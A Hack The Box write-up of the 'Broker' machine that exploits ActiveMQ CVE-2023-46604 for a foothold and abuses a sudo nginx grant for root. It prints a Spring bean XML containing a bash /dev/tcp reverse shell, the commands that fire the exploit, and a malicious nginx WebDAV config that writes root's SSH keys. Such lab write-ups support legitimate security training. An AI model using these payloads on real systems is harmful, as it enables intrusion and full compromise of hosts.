# Broker — HTB Writeup

**Target:** 10.129.230.87
**Difficulty:** Easy
**OS:** Linux
**Date rooted:** June 2026
**Author:** N3uR0nZ

---

## Synopsis

Broker is an Easy-difficulty Linux machine hosting Apache ActiveMQ 5.15.15 behind an nginx reverse proxy. The broker's OpenWire protocol connector is vulnerable to CVE-2023-46604 — unsafe reflection-based class instantiation during exception unmarshalling — which is leveraged to gain a foothold as the `activemq` user. Post-exploitation enumeration reveals a wholesale `sudo` grant on `/usr/sbin/nginx`, which is abused via the WebDAV module to write an SSH public key directly into `/root/.ssh/authorized_keys`, yielding root.

---

## Enumeration

### Full Port Scan

A default top-1000 nmap scan is insufficient here — several of the relevant services sit outside that range. A full TCP sweep is required:

```bash
nmap -p- --min-rate=1000 -Pn 10.129.230.87 -oN allports.txt
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1883/tcp  open  mqtt
5672/tcp  open  amqp
8161/tcp  open  patrol-snmp     (misidentified — actually ActiveMQ web console)
41759/tcp open  unknown
61613/tcp open  unknown          (STOMP)
61614/tcp open  unknown          (STOMP / WebSocket)
61616/tcp open  unknown          (OpenWire)
```

This footprint is the signature of a message broker, not a typical web application: multiple binary protocol connectors (MQTT, AMQP, STOMP, OpenWire) all exposed simultaneously by the same backing service. The shape of the box is infrastructure-heavy, with nginx on port 80 acting mainly as a reverse proxy / delivery layer in front of the ActiveMQ web console rather than as the primary attack surface.

### Service / Version Confirmation

Port 80 returns a 401 immediately:

```bash
curl -i http://10.129.230.87/
```

```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: basic realm="ActiveMQRealm"
...
Powered by Jetty:// 9.4.39.v20210325
```

The response body leaks the Jetty version even though the page itself is access-controlled — a useful reminder to always read full response bodies, not just headers.

The OpenWire connector self-reports its version on raw connection, no authentication required:

```bash
nc -nv 10.129.230.87 61616
```

```
<ActiveMQ ... ProviderVersion 5.15.15 ...>
```

Two independent sources (Jetty banner, OpenWire banner) both corroborate **ActiveMQ 5.15.15** — within the vulnerable range for CVE-2023-46604 (affects versions prior to 5.15.16, 5.16.7, 5.17.6, 5.18.3).

### Web Console Access

The nginx-proxied console on port 80 requires Basic Auth (`ActiveMQRealm`). Default credentials `admin:admin` succeed against it:

```bash
curl -i -u admin:admin http://10.129.230.87/admin/
```

This grants access to the ActiveMQ management console directly, confirming the version a third time via the console's own UI (`Version: 5.15.15`).

A secondary hypothesis — that the direct console port (8161) might bypass nginx's auth entirely due to Jetty's `authenticate=false` default — was tested and **refuted**. A bare, unauthenticated `curl` against port 8161 returns its own independent 401, confirming ActiveMQ enforces auth on that port regardless of the nginx layer in front of it.

![[htb-broker-admin-web-page.png]]


### Jolokia / JMX — Investigated, Not the Intended Path

With valid credentials, Jolokia (`/api/jolokia/`) was reachable but initially returned:

```json
{"error_type":"java.lang.Exception","error":"java.lang.Exception : Origin null is not allowed to call this agent","status":403}
```

Inspection in Burp showed no `Origin` header was present on the request at all — Jolokia's origin check rejects requests lacking the header entirely, rather than validating it against a real allowlist. Supplying any `Origin` header value satisfies the check:

```bash
curl -s -u admin:admin -H "Origin: http://10.129.230.87:8161" \
  http://10.129.230.87:8161/api/jolokia/list
```

This opened full MBean enumeration. A purpose-built Python scoring script was used to surface interesting operations (action-verb names, `java.lang.String` arguments, non-`get*` methods) across the registered MBeans. The most notable non-standard finding was `io.fabric8.insight.LogQuery.getSource` — a third-party MBean rather than stock JVM tooling. This was researched but not pursued to a working exploit; it does not appear in the intended kill chain for this box. Logged as a dead end and discarded under time-box discipline once OpenWire was confirmed as the designed foothold.

![[mbeans-json.png]]

`Jolokia` config also revealed `"useRestrictorService": "false"` — a real hardening gap (no MBean operation allowlist) worth noting independently of whether it was weaponized here.

---

## Foothold — CVE-2023-46604

### Vulnerability Mechanism

OpenWire uses its own custom marshalling format — **not** Java's native `ObjectInputStream` deserialization. The vulnerable path is in exception handling:

```
ExceptionResponseMarshaller.looseUnmarshal()
  → looseUnmarshalThrowable()
  → BaseDataStreamMarshaller.createThrowable(String className, String message)
```

This method reads a class name and a message string directly off the wire and uses reflection (`Class.forName(className).getConstructor(String.class).newInstance(message)`) to construct it — with no validation, pre-patch, that the named class actually extends `Throwable`.

This means an attacker who controls the `className` field can force the broker to instantiate **any class on the classpath** with a single-string constructor argument of their choosing. The standard weaponization target is:

```
org.springframework.context.support.ClassPathXmlApplicationContext
```

Spring's `ClassPathXmlApplicationContext` constructor accepts a path or URL to an XML bean configuration file and immediately parses and loads it. Pointed at an attacker-controlled URL, this becomes a two-stage RCE primitive: the OpenWire packet doesn't carry the payload directly — it carries a pointer to a second artifact the broker will fetch and execute.

This is conceptually distinct from classical Java deserialization (Canape, Laboratory) — there is no gadget chain, no `readObject()`. It is closer to the SpEL injection seen on Inject: an attacker-controlled string reaching a powerful Java capability via reflection/dynamic evaluation, rather than full object-graph deserialization.

### Building the Payload — Two Artifacts

**Artifact A — the OpenWire trigger.** A raw binary packet sent to port 61616 that causes the broker to call `createThrowable()` with `ClassPathXmlApplicationContext` as the class name and an attacker-hosted URL as the constructor argument. Constructed using the public PoC tool (`SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ`, Go) rather than hand-rolled — a deliberate, time-boxed decision; the underlying mechanism was independently researched and understood before reaching for the tool.

**Artifact B — the Spring bean definition.** A hand-built XML file, hosted on an attacker-controlled web server, fetched by the broker as a result of Artifact A:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
     http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.14.207/4444 0&gt;&amp;1</value>
            </list>
        </constructor-arg>
    </bean>

</beans>
```

`ProcessBuilder` is a legitimate, ordinary Java class — Spring's bean framework will happily "configure" it like any other object. Declaring it with `init-method="start"` means the moment Spring instantiates the bean, it calls `.start()` on it — launching the process immediately. The shell operators (`>&`, `&1`) are HTML-entity-escaped (`&gt;`, `&amp;`) since they sit inside an XML attribute/text node.

This payload design intentionally mirrors the SpEL `Runtime.exec()` reverse shell used on Inject — same one-liner, different delivery mechanism. No second download stage (e.g., ELF binary via `curl`+`chmod`+execute) was needed; the `ProcessBuilder` bean *is* the payload.

### Execution

Three terminals, in dependency order:

```bash
# 1. Serve Artifact B
python3 -m http.server 8001

# 2. Catch the shell
nc -lvnp 4444

# 3. Fire Artifact A — points the broker at Artifact B's URL
go run main.go -i 10.129.230.87 -u http://10.10.14.207:8001/bean.xml
```

The broker fetches `bean.xml`, Spring parses it, the `ProcessBuilder` bean fires, and a reverse shell connects back:

```
activemq@broker:/opt/apache-activemq-5.15.15/bin$ id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
```

**User flag:** `/home/activemq/user.txt`


![[htb-broker-revshell-userflag-scaled.png]]

---

## Privilege Escalation

### Discovery

```bash
sudo -l
```

```
User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

No argument restriction — `activemq` can run nginx, as root, with any flags including an arbitrary `-c` config file. This is the same class of misconfiguration referenced in the 2021 Zimbra disclosure: granting sudo on a binary wholesale, without restricting the arguments, hands the caller full control over that binary's behavior — in this case, an entire attacker-authored configuration.

### Mechanism

nginx's core function is serving (and, with the right module enabled, writing) files from the filesystem. Running as root with an attacker-controlled config means:

- The document root can be set to `/` — exposing the entire filesystem
- The `ngx_http_dav_module` can be enabled to accept HTTP `PUT` requests, turning nginx into a write-capable file server
- Files written via `PUT` are owned by the user nginx's worker processes run as — root, if the config specifies `user root;`

### Malicious Configuration

```nginx
user root;
pid /tmp/nginx.pid;

events {}

http {
    server {
        listen 8080;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```

Loaded via the unrestricted sudo grant:

```bash
sudo nginx -c /opt/apache-activemq-5.15.15/bin/evil.conf
```

Confirmed listening:

```bash
ss -tlpn
# LISTEN 0  511  0.0.0.0:8080  0.0.0.0:*
```

### Writing Root's Authorized Keys

An SSH keypair generated locally:

```bash
ssh-keygen -f /tmp/broker_root -N ""
```

The public key written to a local file inside the target shell, then PUT directly to the document-root path corresponding to root's SSH config:

```bash
curl -X PUT -T mykey.pub http://localhost:8080/root/.ssh/authorized_keys
```

Since `root /` maps the filesystem root to the HTTP document root, the URL path `/root/.ssh/authorized_keys` maps directly to the real filesystem path `/root/.ssh/authorized_keys`. nginx, running as root, writes the file with root ownership — bypassing the normal permission boundary that would otherwise block `activemq` from touching anything under `/root`.

### Root

```bash
ssh -i /tmp/broker_root root@10.129.230.87
```

```
root@broker:~# id
uid=0(root) gid=0(root)
```

**Root flag:** `/root/root.txt`


![[broker-rooted 1.png]]

---

## Kill Chain Summary

```
Full port scan → multi-protocol broker identified
  → version confirmed (3 independent sources): ActiveMQ 5.15.15
  → CVE-2023-46604 confirmed in vulnerable range

Artifact A (OpenWire trigger, PoC tool)
  → broker instantiates ClassPathXmlApplicationContext(attacker URL)

Artifact B (hand-built Spring bean XML, self-hosted)
  → ProcessBuilder bean fires on construction
  → reverse shell as activemq

sudo -l → NOPASSWD: /usr/sbin/nginx, no argument restriction

Malicious nginx config (user root, dav_methods PUT, root /)
  → loaded via sudo
  → WebDAV PUT writes SSH public key to /root/.ssh/authorized_keys
  → SSH in as root
```

---

## Notes on Approach

Two deliberate departures from the most common public approach to this box are worth flagging:

1. **Foothold payload** — a direct embedded bash reverse shell inside the Spring bean (`ProcessBuilder` running `bash -i >&...`) was used instead of a two-stage `curl`-and-execute-an-ELF-binary approach. Fewer moving parts, same result.
2. **Jolokia/JMX** was explored as a secondary attack surface before committing fully to OpenWire. It did not pan out as a foothold path on this box, but the enumeration tooling built for it (MBean operation scoring by action-verb, argument type, and naming convention) is reusable on any future Jolokia-exposed target.
